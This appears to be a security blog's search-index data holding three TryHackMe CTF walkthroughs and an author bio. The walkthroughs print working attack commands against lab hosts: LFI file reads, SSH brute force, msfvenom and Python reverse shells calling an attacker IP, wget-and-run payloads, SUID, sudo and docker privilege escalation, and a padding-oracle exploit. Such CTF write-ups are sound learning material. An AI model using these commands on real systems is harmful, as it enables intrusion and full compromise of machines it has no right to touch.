Follow the above image to install basic nessus plugins. About --\u0026gt; Sowtware Update --\u0026gt; Update all components --\u0026gt; Save. Wait for some time to so that plugins will be installed. Status of plugin installation will be observed in notification section which is in top right of the screen.\nNessus Scan Use this option to start a new scan.\nSelect the requires scan type. I\u0026rsquo;m going with Web Application Scan to test a website.\nGive the required details with target ip or domain and save it.\nLaunch Nessus Scan Nessus Scan Status Nessus Scan Result ","permalink":"https://cyberjagadeesh.github.io/posts/nessus/writeup/","tags":["Nessus","Installation"],"title":"Nessus Installation Guide"},{"categories":["CTF"],"content":"Introduction Detailed walkthroughs for Airplane CTF challenges on TryHackMe .\nTools Used rustscan, ffuf, nessus, curl, nc, gdb, ssh-keygen, ssh\nEnumeration Lets start the process by mapping host-name to target IP address.\nsudo echo \u0026#34;10.10.249.133 airplane.thm\u0026#34; \u0026gt;\u0026gt; /etc/hosts Rustscan Let\u0026rsquo;s start enumaration process using rustscan portscanner.\n$ rustscan -a airplane.thm -- -sC -sV Open 10.10.249.133:22 Open 10.10.249.133:6048 Open 10.10.249.133:8000 [~] Starting Script(s) [\u0026gt;] Running script \u0026#34;nmap -vvv -p {{port}} {{ip}} -sC -sV\u0026#34; on ip 10.10.249.133 PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 60 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 b8:64:f7:a9:df:29:3a:b5:8a:58:ff:84:7c:1f:1a:b7 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCuy7X5e34bStIhDkjJIcUT3kqFt9fHoI/q8AaCCH6HqgOz2HC5GdcDiBN8W6JMoRIIDJO/9FHiFE+MNtESwOP9J+S348GOhUIsVhDux7caJiyJQElrKxXJgxA7DNUvVJNBUchhgGhFv/qCNbUYF8+uaTYc0o/HtvgVw+t/bxS6EO+OlAOpyAjUP5XZjGTyc4n4uCc8mYW6aQHXZR0t5lMaKkNJzXl5+kHxxxnKci6+Ao8vrlKshgIq25NErSqoeTs/wgBcPMkr5r++emLH+rDwmjrTvwrHb2/bKKUenvnbf9AZXbcN52nGthVi95kP6HaDGijXULjrRt2GCul99OmNhEQxJNtLmUnxpxA9ZhBEzMYe3z5EeIbLuA+E9yFSrR6nq2pagC2/qvVMJSAzD749AbwjtbcL8MOf+7DCT+SATY9VxBqtKep/9PDolKi5+prGH6gzfjCkj5YaFS2CvJeGlF/B1XBzd1ccm43Lc4Ad/F4kvQWwkHmpL38kDy4eWCE= | 256 ad:61:3e:c7:10:32:aa:f1:f2:28:e2:de:cf:84:de:f0 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLYVoN15q7ky/IIo3VNrL35GRCpppImVs7x+PPFRlqO+VcfQ8C+MR2zVEFS0wosQWQFXaCZiInQhWz9swfKN6J8= | 256 a9:d8:49:aa:ee:de:c4:48:32:e4:f1:9e:2a:8a:67:f0 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFIB0hj2IqNazZojgwv0jJr+ZnOF1RCzykZ7W3jKsuCb 6048/tcp open x11? syn-ack ttl 60 8000/tcp open http-alt syn-ack ttl 60 Werkzeug/3.0.2 Python/3.8.10 |_http-title: Did not follow redirect to http://airplane.thm:8000/?page=index.html | http-methods: |_ Supported Methods: OPTIONS HEAD GET |_http-server-header: Werkzeug/3.0.2 Python/3.8.10 | fingerprint-strings: | FourOhFourRequest: | HTTP/1.1 404 NOT FOUND | Server: Werkzeug/3.0.2 Python/3.8.10 | Date: Sun, 04 Aug 2024 12:42:27 GMT | Content-Type: text/html; charset=utf-8 | Content-Length: 207 | Connection: close | \u0026lt;!doctype html\u0026gt; | \u0026lt;html lang=en\u0026gt; | \u0026lt;title\u0026gt;404 Not Found\u0026lt;/title\u0026gt; | \u0026lt;h1\u0026gt;Not Found\u0026lt;/h1\u0026gt; | \u0026lt;p\u0026gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.\u0026lt;/p\u0026gt; | GetRequest: | HTTP/1.1 302 FOUND | Server: Werkzeug/3.0.2 Python/3.8.10 | Date: Sun, 04 Aug 2024 12:42:21 GMT | Content-Type: text/html; charset=utf-8 | Content-Length: 269 | Location: http://airplane.thm:8000/?page=index.html | Connection: close | \u0026lt;!doctype html\u0026gt; | \u0026lt;html lang=en\u0026gt; | \u0026lt;title\u0026gt;Redirecting...\u0026lt;/title\u0026gt; | \u0026lt;h1\u0026gt;Redirecting...\u0026lt;/h1\u0026gt; | \u0026lt;p\u0026gt;You should be redirected automatically to the target URL: \u0026lt;a href=\u0026#34;http://airplane.thm:8000/?page=index.html\u0026#34;\u0026gt;http://airplane.thm:8000/?page=index.html\u0026lt;/a\u0026gt;. If not, click the link. | Socks5: | \u0026lt;!DOCTYPE HTML PUBLIC \u0026#34;-//W3C//DTD HTML 4.01//EN\u0026#34; | \u0026#34;http://www.w3.org/TR/html4/strict.dtd\u0026#34;\u0026gt; | \u0026lt;html\u0026gt; | \u0026lt;head\u0026gt; | \u0026lt;meta http-equiv=\u0026#34;Content-Type\u0026#34; content=\u0026#34;text/html;charset=utf-8\u0026#34;\u0026gt; | \u0026lt;title\u0026gt;Error response\u0026lt;/title\u0026gt; | \u0026lt;/head\u0026gt; | \u0026lt;body\u0026gt; | \u0026lt;h1\u0026gt;Error response\u0026lt;/h1\u0026gt; | \u0026lt;p\u0026gt;Error code: 400\u0026lt;/p\u0026gt; | \u0026lt;p\u0026gt;Message: Bad request syntax (\u0026#39; | \u0026#39;).\u0026lt;/p\u0026gt; | \u0026lt;p\u0026gt;Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.\u0026lt;/p\u0026gt; | \u0026lt;/body\u0026gt; |_ \u0026lt;/html\u0026gt; Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel ** Info ** port service 22 ssh 6048 unknown 8000 web application OS : Linux Here port 8000 is interesting.\nAirplane: Home page This is a website with simple blog about the airplanes. airplane.thm:8000 redirects to airplane.thm:8000/?page=index.html A simple web search give us the vulnerability information about the version Werkzeug/3.0.2 Python/3.8.10. Google Search: Werkzeug/3.0.2 Lets try to exploit it using Werkzeug - \u0026lsquo;Debug Shell\u0026rsquo; Command Execution .\n$ python2 exploit.py airplane.thm 8000 10.10.10.1 1234 [-] Debug is not enabled When used exploitdb result to make Debug Shell Command Execution, it failed. Lets proceed to next step.\nLets fuzz the fles/directories\n$ ffuf -c -u http://airplane.thm:8000/FUZZ -w /usr/share/wordlists/dirb/big.txt airplane [Status: 200, Size: 655, Words: 33, Lines: 36, Duration: 171ms] airplane.thm:8000/airplane is just a simple animation, not useful.\nffuf -u http://airplane.thm:8000/ -H \u0026#34;HOST: FUZZ.airplane.thm\u0026#34; -w /usr/share/SecLists-master/Discovery/DNS/subdomains-top1million-5000.txt --mc 200 Checked vhosts but nothing interesting found.\nNessus Nessus Web App scan result Used Nessus Web Application scaner and found LFI vulnerability.\ncurl http://airplane.thm:8000/?page=../../../../../../../../etc/passwd \u0026gt; passwd $ grep /bin/bash passwd root:x:0:0:root:/root:/bin/bash carlos:x:1000:1000:carlos,,,:/home/carlos:/bin/bash hudson:x:1001:1001::/home/hudson:/bin/bash Found 3 usernames: root, carlos, hudson.\nexport filename=users.txt echo root \u0026gt; $filename \u0026amp;\u0026amp; echo carlos \u0026gt;\u0026gt; $filename \u0026amp;\u0026amp; echo hudson \u0026gt;\u0026gt; $filename Lets start brutforcing ssh with the usernames.\nhydra -L users.txt -P /usr/share/wordlists/rockyou.txt airplane.thm ssh No useful results found.\nLets use LFI to gather more information.\n/proc/ $ curl http://airplane.thm:8000/?page=../../../../../../../../proc/self/environ --output - LANG=en_US.UTF-8LC_ADDRESS=tr_TR.UTF-8LC_IDENTIFICATION=tr_TR.UTF-8LC_MEASUREMENT=tr_TR.UTF-8LC_MONETARY=tr_TR.UTF-8LC_NAME=tr_TR.UTF-8LC_NUMERIC=tr_TR.UTF-8LC_PAPER=tr_TR.UTF-8LC_TELEPHONE=tr_TR.UTF-8LC_TIME=tr_TR.UTF-8PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/binHOME=/home/hudsonLOGNAME=hudsonUSER=hudsonSHELL=/bin/bashINVOCATION_ID=b6661084f65743da8c323f7d0963e579JOURNAL_STREAM=9:20506 From USER=hudson in the above result, we confirmed that LFI is possible as user hudson.\n$ curl http://airplane.thm:8000/?page=../../../../../../../../proc/self/cmdline --output - /usr/bin/python3app.py # The /proc/self/cmdline file in the Linux /proc filesystem contains the command-line arguments that were used to start the currently executing process. The current process is executed by running /usr/bin/python3 app.py in the target system by victim user.\n$ curl http://airplane.thm:8000/?page=../../../../../../../../proc/sched_debug --output - | grep airplane runnable tasks: S task PID tree-key switches prio wait-time sum-exec sum-sleep ----------------------------------------------------------------------------------------------------------- t airplane 580 14.246406 5 120 0.000000 1.842503 0.000000 0 0 /autogroup-73 # using /proc/sched_debug to check for interesting running processes. While checking the processes running in the system, found a process called airplane with PID:580.\n$ curl http://airplane.thm:8000/?page=../../../../../../../../proc/580/cmdline --output - /opt/airplane Process airplane is started from /opt/airplane.\n$ curl http://airplane.thm:8000/?page=../../../../../../../../proc/580/stat --output - 580 (airplane) t 531 580 531 0 -1 1073741824 132 0 0 0 0 0 0 0 20 0 1 0 1618 364544 1 18446744073709551615 93824992231424 93824992236021 140737488350208 0 0 0 0 4096 0 1 0 0 17 1 0 0 6 0 0 93824992247224 93824992247824 93824992251904 140737488350742 140737488350756 140737488350756 140737488351210 0 Checking the status of PID 580 (airplane) we got the parent process PID 531.\n$ curl http://airplane.thm:8000/?page=../../../../../../../../proc/531/cmdline --output - /usr/bin/gdbserver0.0.0.0:6048airplane While checking the status of PID 531, we got that /usr/bin/gdbserver is being run in port 6048.\nExploitation Hacktricks: GdbServer From Hacktricks: GdbServer we got some info about gdbserver, and exploitation techniques. Lets follow that.\nnc -nvlp 4444 Start a netcat listener at port 4444.\n# Update your local ip in the place of 10.10.10.1 msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.1 LPORT=4444 PrependFork=true -f elf -o binary.elf chmod +x binary.elf # install gdb if not exist using \u0026#34;sudo apt install gdb\u0026#34; gdb binary.elf # Set remote debuger target target extended-remote airplane.thm:6048 # Upload elf file remote put binary.elf /tmp/binary.elf # Set remote executable file set remote exec-file /tmp/binary.elf # Execute reverse shell executable run # You should get your reverse-shell This is the exploit command modified from Hacktricks:Gdbserver-exploit . By running the above commands, got reverse shell as user hudson.\npython3 -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; ^Z #(Ctrl+Z) stty raw -echo \u0026amp;\u0026amp; fg export TERM=xterm Got stable shell by running above commands.\n$ find / -type f -perm -04000 -ls 2\u0026gt;/dev/null 262477 316 -rwsr-xr-x 1 carlos carlos 320160 Feb 18 2020 /usr/bin/find While checking for SUID binary found a useful hit, we can run /usr/bin/find as user carlos. Lets use GTFOBins:find to get the privilege of user carlos.\nLateral Movement $ /usr/bin/find . -exec /bin/sh -p \\; -quit # exploiting the SUID binary find $ id uid=1001(hudson) gid=1001(hudson) euid=1000(carlos) groups=1001(hudson) Now we can run commands as user carlos. We dont have interactive shell now, lets use ssh for getting better shell.\nssh-keygen -t rsa -f id_rsa -b 4096 -C \u0026#39;\u0026#39; -N \u0026#39;\u0026#39; Run the above command to generate a SSH key pair in local machine.\necho \u0026#39;contents_of_id_rsa.pub\u0026#39; \u0026gt; /home/carlos/.ssh/authorized_keys Run the above command in remote machine. This will make the key trusted for ssh connection.\nssh carlos@airplane.thm -i id_rsa Running the above command we got ssh connection as user carlos with better shell.\nPrivilege Escalation carlos@airplane:~$ id uid=1000(carlos) gid=1000(carlos) groups=1000(carlos),27(sudo) carlos@airplane:~$ sudo -l Matching Defaults entries for carlos on airplane: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User carlos may run the following commands on airplane: (ALL) NOPASSWD: /usr/bin/ruby /root/*.rb From the above results we are able to run /usr/bin/ruby /root/*.rb as root using sudo command.\necho \u0026#39;exec \u0026#34;/bin/sh\u0026#34;\u0026#39; \u0026gt; /tmp/exploit.rb sudo /usr/bin/ruby /root/../tmp/exploit.rb Created exploit.rb using hint from Hacktricks: ruby-sudo . Here ../ means previous directory by 1 step. /root/../ is equal to / directory. Thus we can use the file /tmp/exploit.rb by the path /root/../tmp/exploit.rb. We got root access by running the above command.\ncat /home/carlos/user.txt /root/root.txt We got user and root flags by running the above commands.\nHappy Hacking !!! \u0026#x1f60e;\n","permalink":"https://cyberjagadeesh.github.io/posts/airplane/writeup/","tags":["ffuf","nessus","lfi","/proc","gdbserver","msfvenom","betterShell","SUID","ssh-keygen"],"title":"Airplane | THM Writeup"},{"categories":["CTF"],"content":"Introduction Detailed walkthrough for New York Flankees CTF challenges on TryHackMe .\nTools Used rustscan, burpsuite\nEnumeration Lets start the process by mapping host-name to target IP address.\nsudo echo \u0026#34;10.10.140.44 nythm.com\u0026#34; \u0026gt;\u0026gt; /etc/hosts Let\u0026rsquo;s start enumaration process using rustscan portscanner.\nrustscan -a nythm.com -- -sC -sV .----. .-. .-. .----..---. .----. .---. .--. .-. .-. | {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \\ | `| | | .-. \\| {_} |.-._} } | | .-._} }\\ }/ /\\ \\| |\\ | `-\u0026#39; `-\u0026#39;`-----\u0026#39;`----\u0026#39; `-\u0026#39; `----\u0026#39; `---\u0026#39; `-\u0026#39; `-\u0026#39;`-\u0026#39; `-\u0026#39; The Modern Day Port Scanner. _______________________________________ Open 10.10.140.44:22 Open 10.10.140.44:8080 [~] Starting Script(s) [\u0026gt;] Running script \u0026#34;nmap -vvv -p {{port}} {{ip}} -sC -sV\u0026#34; on ip 10.10.140.44 PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 60 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 86:03:99:d9:07:c6:f5:8c:48:11:b7:56:58:fe:72:06 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDAHznW6yrO1o2or52QbWKmOLRYEcbWUD2zy0gHcYzw2sqhx9U/pJxJOa5Z0fwuMVPjRtqGLOk3EOrBnQ6LstnOyGx0KUsBn3c/hSHNCS9uzVbDzikf6ffQLw0hAcJzSi1EsQDRkeyJ24NuzhQ9RXKO1R1Gr0RB4AcmvIoNspcxV0KTiTOIWuAPiJLiZtsOSS39zghuRjvWwnWQ3jR0X2r5NPjphojx3pKxlDNhf9gpaz2kck/Jv8cfktisANej2q4JY+BEL9VaxyBV8DOq/WU9E8TvIGYEK1sOh1UKCl7JgKBbA+30Wge+/EsiV/zEQooDQvNUT5YgUwCCAdClLYxR996glhDywuGYIAOE/VIP69k0JAbkZy8kwP22t0ZHunJrFaPWL5iw++O6/NKTL2xQXwAmKZu81B7Un3Q35lal7k6YO9agJJ4oxD7z15Ee+eJf4KxSOYhSA89KhDQSbrkpZKMyuJ6uoJHXVVyZmMRO2IaraJaY156vZxe9fkOyLvE= | 256 0e:b9:fd:e8:8a:7c:fc:b9:91:b0:3d:0d:16:c9:43:3c (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN1JAvVFTNHO87FGw+Q3NxpS0st1TbH9/Tn+PLJMBdVQ/NHeBZSdt/954gYSL6c0Plt8YiuVswjf//DSHz1rff0= | 256 9c:be:88:a2:44:56:2b:ba:dd:b9:5a:da:f2:24:8a:f5 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILwrt82psPblgKYPcZ1VkSr/bVktYgYaVX+zqGdFFrwK 8080/tcp open http syn-ack ttl 59 Octoshape P2P streaming web service |_http-title: Hello world! | http-methods: |_ Supported Methods: GET |_http-favicon: Unknown favicon MD5: 6FD74A43E6C5F7502642326FAB0B3E69 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel From the above results we found 2 open ports 22(ssh) and 8080(web server) and the operating system is Linux. Starting with port 8080.\nHome Page This is a blog website of user Stefan. Here the word Oracle is highlighted 2 times using bold text and image. So, must be using one of the Oracle services.\nAdmin Login Page This website have an admin login page which will use it in future, as we need to enumarate further to get hints about username or password.\nDebug page This website also have an Dubug page, which is giving hints about Implementation of custom authentication mechanism and verbose error (padding).\nview-source of home page We found a script in the page while checking the source of the page.\nadding cookie using cookie editor extension Tried to bypass the login by adding the loggedin cookie using cookie editor[firefox extension], but exec.html page gives error.\nInspect: debug.html page Checking network history of debug.html page, found one interesting request trying to connect to its localhost. Lets change its host to its webserver address.\nchanging the host using Burpsuite Changing the host of the request to web server address gives us response: Custom authentication success.\nmodifying the url using Burpsuite When modifying the string after /api/debug/ in the request, we got an error: Decryption error as a response. This informs there is some cryptography is being used here. So, I tried to decrypt the string below\n39353661353931393932373334633638EA0DCC6E567F96414433DDF5DC29CDD5E418961C0504891F0DED96BA57BE8FCFF2642D7637186446142B2C95BCDEDCCB6D8D29BE4427F26D6C1B48471F810EF4 using various decryption tools, but none of those helped. Proceeding further.\nPadding Oracle Google Search After multiple attempts of Google search using hints we have, found an interesting result.\nPadding Oracle - HackTricks Padding Oracle - HackTricks : The same behaviour (error when modifing the value) we observed in /api/debug/ request. By this point we got that the web application is vulnerable to padding oracle vulnerability.\nExploitation Found multiple exploit codes for this vulnerability when googling it. Search term used padding oracle vulnerability exploit github. Two exploits I\u0026rsquo;ve used are below.\nmpgn/Padding-oracle-attack - slow and detailed python exploit.py -c 39353661353931393932373334633638EA0DCC6E567F96414433DDF5DC29CDD5E418961C0504891F0DED96BA57BE8FCFF2642D7637186446142B2C95BCDEDCCB6D8D29BE4427F26D6C1B48471F810EF4 -l 16 --host nythm.com:8080 -u /api/debug/ --error \u0026#34;Decryption error\u0026#34; glebarez/padre - binary - fast chmod +x padre-linux-amd64 ./padpadre-linux-amd64re -u \u0026#39;http://nythm.com:8080/api/debug/$\u0026#39; -e lhex 39353661353931393932373334633638EA0DCC6E567F96414433DDF5DC29CDD5E418961C0504891F0DED96BA57BE8FCFF2642D7637186446142B2C95BCDEDCCB6D8D29BE4427F26D6C1B48471F810EF4 The above exploits will give the username and password in the format username:password, which is the flag1 of this lab.\nAdmin login lets use the username:password combination to login the admin panel.\nSuccessful Addmin login Kudos!!! \u0026#x1f929; We found the flag2. There is a command box and a submit button which we might be useful to get reverse shell. Lets check its behaviour.\nExecuting valid command Executing valid command gives OK response.\nExecuting invalid command Executing invalid command gives empyt response. Lets use this behaviour to get reverse shell code.\nReverse Shell python3 -c \u0026#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;10.11.10.99\u0026#34;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\u0026#34;sh\u0026#34;)\u0026#39; # Replace the LHOST(10.11.10.99) with your local ip. Using Reverse Shell Generator to get reverse shell commands, and confirming the valid command using response from the command. The above command gives OK response, means working without any errors. But not getting reverse shell connection. So, creating a shell script exploit.sh in local machine which will be usefull for reverse shell. The contents of the script exploit.sh should be the above command.\nnc -nvlp 1234 Setting up the listener in local machine using the above command in the port 1234.\npython -m http.server 8000 Starting Python HTTP Server in the directory of exploit.sh script, to transfer it to the target system. This will start the http server in port 8000.\nwget http://10.11.10.99:8000/exploit.sh chmod +x exploit.sh ./exploit.sh # Replace 10.11.10.99 your local ip address. # The above commands should be runned individually. Running the above commands in exec.html makes reverse shell. Now we are in the target system as root user.\u0026#x1f60e;\nInteractive shell python3 -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; ^Z #(Ctrl+z) stty raw -echo \u0026amp;\u0026amp; fg export TERM=xterm Got Interactive shell by running the above commands.\nLets enumarate the files in the target system for next flag. Found an interesting directory /app/.\nroot@02e849f307cc:/app# ls Dockerfile gradle ktor-docker-sample.jar README.md gradle.properties settings.gradle.kts build.gradle.kts gradlew src docker-compose.yml gradlew.bat root@02e849f307cc:/app# cat README.md # README * To get started, simply run `docker-compose up` Directory /app/ contains files related to docker. We can also found README.md file which is pointing to docker-compose file. Viewing the contents of /app/docker-compose.yml we got the next flag3.\nLets check for the docker, and run it if exits.\nDocker root@02e849f307cc:/# docker images REPOSITORY TAG IMAGE ID CREATED SIZE padding-oracle-app_web latest cd6261dd9dda 2 months ago 1.01GB \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; 4187efabd0a5 2 months ago 704MB gradle 7-jdk11 d5954e1d9fa4 3 months ago 687MB openjdk 11 47a932d998b7 2 years ago 654MB root@02e849f307cc:/# docker run -it -v /:/host/ 47a932d998b7 chroot /host/ bash root@e62f1c047af3:/# ls bin dev flag.txt lib lib64 lost+found mnt proc run snap sys usr boot etc home lib32 libx32 media opt root sbin srv tmp var root@e62f1c047af3:/# cat flag.txt THM{FLAG} There were 4 docker images available on the system. While trying to run one of the docker, we got interactive shell in it. Here we got the flag4.\nThis is end of the lab \u0026#x1f36d;\nHappy Hacking!!!\u0026#x1f47d;\n","permalink":"https://cyberjagadeesh.github.io/posts/thenewyorkflankees/writeup/","tags":["Oracle padding","Docker"],"title":"New York Flankees | THM Writeup"},{"categories":["CTF"],"content":"Introduction Detailed walkthrough for CyberLens CTF challenges on TryHackMe .\nTools Used rustscan, ping, burpsuite, nc, metasploit, msfvenom.\nEnumeration Lets start the process by mapping host-name to target IP address. mapping cyberlens.thm to the target IP address When any user or application on the system tries to access cyberlens.thm, it will be directed to the IP address specified in the /etc/hosts file. Lets use rustscan for port scanning the target domain. Rustscan is tool to scan the network ports faster.\nrustscan -a cyberlens.thm -- -sC -sV # -a - IPs, or hosts to be scanned # -- -sC -sV - this command adds -sC -sV automatically to nmap #[Eg: nmap -sC -sV cyberlens.thm] rustscan of cyberlens.thm Found 16 open ports on the initial scan of posts using rustscan. Lets wait for executing nmap -sC -sV cyberlens.thm scan. scan result of nmap -sC -sV cyberlens.thm We got service and default script scan results of the host. Found multiple open ports. Lets start with web service, which is running in port 80 and port 61777. We have also confirmed that the target machine is running Windows OS from the above results. cyberlens.thm This is the website to extract the metadata of the images. Lets try using its functionality. metadata result Lets capture its functionality using Burp-suite. Burp-suite capture By checking the burp-suite we know that its connecting to port 61777 to get the meta data of the image. cyberlens.thm:61777 Exploitation Apache Tika 1.17 Server is running in port 61777. Lets make a search about the server. search Apache Tika 1.17 Server Found an interesting git result, where there is detailed information about the vulnerability and its POC in Apache Tika 1.17 Server. Lets use this git page to exploit the vulnerability.\nLet\u0026rsquo;s test the python script from the git by uploading it.\npython -m http.server \u0026lt;port\u0026gt; # -m \u0026lt;module_name\u0026gt; - python module to be used python http.server lin tening in port 9037 certutil -urlcache -f \u0026lt;file_url\u0026gt; \u0026lt;output_file_name\u0026gt; # command to download a file from internet in Windows running exploit.py python script When we try to download a file exploit.py using the script from git, it was successfully downloaded in the target machine. Lets use this for the reverse shell. Getting reverse shell Uploading nc.exe and got reverse shell from it. And we are now logged in as user cyberlens in the target machine. flag 1 We got flag 1.\nPrivilege Escalation Lets start enumerate the system for privilege escalation vector using winPEASx64.exe . executing winPEASx64.exe Found an interesting result. AlwaysInstallElevated Privilege Escalation vector Lets check about it in internet. about AlwaysInstallElevated Found an interesting page where we get information about AlwaysInstallElevated. If .msi file is executed, it will be running with administrator privilege.\nLets create a .msi file to get reverse shell with elevated Privileges.\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=\u0026lt;local_ip\u0026gt; lport=\u0026lt;local_port\u0026gt; -a x64 --platform windows -f msi -o payload.msi # -p - payload to use # -a - The architecture to useitecture # --platform - The platform of the payload # -f - Output format # -o - Save the payload as Lets generate and upload the payload to get reverse shell. getting reverse shell with elevated privs We have generated .msi file using msfvenom, uploaded and executed to get reverse shell as user nt authority\\system. flag 2 We got flag 2.\nAlternate Solution using Metasploit We know that vulnerable web application running apache tika. lets search it. Exploit using Metasploit Using the module exploit/windows/http/apache_tika_jp2_jscript, setting rhosts, rport, lhost and running the module. We confirmed that the target is vulnerable and exploitable. getting meterpreter as CyberLens We got the meterpreter session for the payload. Making this session to background using background command to proceed further. Privilege Escalation using Metasploit Searching AlwaysInstallElevated for privilege escalation in metasploit and got a result windows/local/always_install_elevated.\nSetting session, rhosts, rport, lhost and running the module. We got a new session as user NT AUTHORITY\\SYSTEM, which is highest privilege user in windows.\nFinally we have completed the room Cyberlens.\nHappy Hacking!!!\n","permalink":"https://cyberjagadeesh.github.io/posts/cyberlens/writeup/","tags":["CVE-2018-1335","AlwaysInstallElevated","msi","apache_tika","metasploit","msfvenom"],"title":"CyberLens CTF |THM Writeup"},{"categories":null,"content":"","permalink":"https://cyberjagadeesh.github.io/manifest.json","tags":null,"title":""},{"categories":null,"content":"","permalink":"https://cyberjagadeesh.github.io/search/_index.es/","tags":null,"title":""},{"categories":null,"content":"","permalink":"https://cyberjagadeesh.github.io/search/_index.fr/","tags":null,"title":""},{"categories":null,"content":"","permalink":"https://cyberjagadeesh.github.io/search/_index.hi/","tags":null,"title":""},{"categories":null,"content":"","permalink":"https://cyberjagadeesh.github.io/search/_index.jp/","tags":null,"title":""},{"categories":null,"content":"","permalink":"https://cyberjagadeesh.github.io/search/_index.pl/","tags":null,"title":""},{"categories":null,"content":"","permalink":"https://cyberjagadeesh.github.io/search/_index.ru/","tags":null,"title":""},{"categories":null,"content":"","permalink":"https://cyberjagadeesh.github.io/search/_index.zh-cn/","tags":null,"title":""},{"categories":null,"content":"About Me Hii there,\nA little about myself:\nI am Jagadeeshwaran, @CyberJagadeesh. With a strong foundation in Android Application Reverse Engineering built over 3 years, I have developed a keen eye for understanding how apps function and identifying potential vulnerabilities. My passion extends to the broader realm of cybersecurity, where I specialize in penetration testing with a particular focus on web application security and network vulnerability assessments. To stay at the forefront of the field, I am dedicated to continuous learning, actively participating in CTF challenges, and expanding my skill set to include DAST (Dynamic Application Security Testing). As an eJPT certified professional, I am committed to safeguarding digital assets and collaborating with others to build a more secure digital landscape.\nMy expertise lies in dissecting Android applications to uncover hidden functionalities and weaknesses. This knowledge, coupled with my proficiency in penetration testing, allows me to identify and mitigate potential threats to digital systems. I am constantly seeking new challenges and opportunities to enhance my skill set. By combining my technical abilities with a passion for problem-solving, I strive to be a valuable asset in any cybersecurity team.\nTryHackMe Profile ","permalink":"https://cyberjagadeesh.github.io/about/","tags":null,"title":"whoami"}]